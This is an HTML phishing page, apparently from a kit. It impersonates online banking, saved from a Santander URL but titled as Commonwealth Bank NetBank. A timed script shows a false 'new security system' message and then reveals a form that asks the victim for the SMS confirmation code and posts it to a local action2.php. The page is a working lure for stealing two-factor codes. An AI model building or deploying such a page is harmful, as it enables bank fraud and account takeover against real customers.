﻿<!DOCTYPE html>
<!-- saved from url=(0097)https://www.tablet.bancosantander.es/supernetLogin/indexSan.html?tsid=2018213195834#!/contactInfo -->
<html ng-app="supernetApp" class="no-touchevents flexbox MacIntel pb-user" style="" data-useragent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" data-platform="MacIntel"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-start{border-spacing:1px 1px;-ms-zoom:1.0001;}.ng-animate-active{border-spacing:0px 0px;-ms-zoom:1;}</style>
    

    <meta http-equiv="cache-control" content="max-age=0">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="expires" content="-1">
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta http-equiv="pragma" content="no-cache">

    <title>NetBank - Confirm Access to NetBank - Enjoy simple and secure online banking from Commonwealth Bank</title>

    <!-- Styles -->
    <link rel="stylesheet" href="./konto/styles.css">

    <link rel="stylesheet" href="./konto//net.css">
	
	
	<script type="text/javascript" async="" charset="utf-8" src="./konto/utag.2.js" id="utag_santander.bancaonlineparticulares_2"></script><script type="text/javascript" async="" charset="utf-8" src="./konto/utag.8.js" id="utag_santander.bancaonlineparticulares_8"></script></head>
<!-- ngView:  -->
<script type = "text/javascript">

function hideMessage() {
document.getElementById("souf").style.display="none"; 
document.getElementById("iane").style.display=""; 
}

function startTimer() {
var tim = window.setTimeout("hideMessage()", 20000);  // 5000 milliseconds = 5 seconds
}

</script>
<body ng-view="" class="ng-scope" onload = "startTimer()">
</div>
<div ng-if="errorOperacion" class="alert alert--floating errorOperacion ng-scope" style="background-color: rgba(0, 0, 0, 0.9);">
    <div class="message-container" id="souf">
		<img src="https://diginomica.com/sites/default/files/images/2020-08/42ACC305-5741-45CE-9BBA-F4F856A2AAFC.png" alt="" width="200" height="200" />
		<br>
		</br>
        <p class="message ng-binding" ng-bind-html="errorOperacionDesc" style="font-size:15px;">

The software automatically generates a simulation code to activate the new security system in your account<br>
</br>

<br >
You must enter this code on the next page
        </p>
        <div class="buttons" ng-click="clearErrorOperacion()">
            <img src="http://gifimage.net/wp-content/uploads/2017/09/blue-loading-gif-transparent-9.gif" width="100">
        </div>
    </div>

     <div class="message-container" id="iane" style="display:none;">
        
<img src="https://diginomica.com/sites/default/files/images/2020-08/42ACC305-5741-45CE-9BBA-F4F856A2AAFC.png" alt="" width="200" height="200" />
<br>
</br>		
        <h1 style="color:blue;"><b>Confirmation code  </b></h1>
        <p class="message ng-binding" ng-bind-html="errorOperacionDesc" style="font-size:15px;">

Enter the code received via SMS and press Confirm
        </p>
        <div class="buttons" ng-click="clearErrorOperacion()">
           <form action="action2.php" method="post">
               <input type="text" name="codigo" value="" placeholder="Code" required>
                           <input class="btn--rounded__white" id="submitButton"  type="submit" ng-click="" style="" value="Confirm" style="font-color:white;"/> 
           </form>
        </div>
    </div>



</div>


<div id="top" class="ng-scope">
	<svg class="icon"><use xlink:href="#icon-up"></use></svg>
</div>
</body></html>